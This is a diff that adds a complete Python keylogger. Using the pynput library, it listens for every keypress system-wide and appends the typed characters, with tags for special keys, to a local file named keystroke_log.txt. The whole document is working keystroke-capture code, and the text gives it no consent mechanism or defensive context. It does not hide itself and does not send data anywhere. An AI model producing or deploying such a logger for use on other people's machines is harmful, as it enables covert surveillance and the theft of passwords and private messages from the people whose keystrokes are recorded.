@@ -1,0 +1,39 @@
+from pynput.keyboard import Key, Listener
+
+# Path to the file where keystrokes will be logged
+log_file = "keystroke_log.txt"
+
+# Function to write the pressed key to a log file
+def on_press(key):
+    with open(log_file, 'a') as f:
+        # Replace special keys
+        if hasattr(key, 'char'):
+            f.write(key.char)
+        elif key == Key.space:
+            f.write(' ')
+        elif key == Key.enter:
+            f.write('\n')
+        elif key == Key.backspace:
+            f.write('[BACKSPACE]')
+        elif key == Key.tab:
+            f.write('\t')
+        elif key == Key.shift:
+            f.write('[SHIFT]')
+        elif key == Key.ctrl_l or key == Key.ctrl_r:
+            f.write('[CTRL]')
+        elif key == Key.alt_l or key == Key.alt_r:
+            f.write('[ALT]')
+        elif key == Key.esc:
+            f.write('[ESC]')
+        elif key == Key.delete:
+            f.write('[DELETE]')
+        elif key == Key.up or key == Key.down or key == Key.left or key == Key.right:
+            f.write('[ARROW]')
+        elif key == Key.caps_lock:
+            f.write('[CAPS_LOCK]')
+        else:
+            f.write('[' + str(key) + ']')
+
+# Setting up the listener
+with Listener(on_press=on_press) as listener:
+    listener.join()
